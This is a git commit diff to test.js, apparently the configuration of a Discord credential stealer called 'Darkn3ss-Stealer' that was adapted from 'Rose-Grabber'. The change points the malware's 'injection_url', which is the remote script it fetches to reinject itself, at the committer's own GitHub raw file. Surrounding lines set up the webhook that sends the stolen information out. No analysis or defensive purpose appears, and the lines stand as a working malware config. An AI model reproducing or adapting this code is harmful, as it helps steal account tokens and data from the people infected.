4c9a704722e893b848c7bb55d048654e3b2c5ff7
ICoolBuddy <81433896+ICoolBuddy@users.noreply.github.com>
2023-10-27 19:13:01 +0300

    Update test.js

--- test.js
+++ test.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Darkn3ss-Stealer', //name of the webhook thats gonna send the info
   embed_icon: 'https://media.discordapp.net/attachments/1158616227304980501/1167490102658859020/download.jpeg', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/data/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/ICoolBuddy/aderre/main/test.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
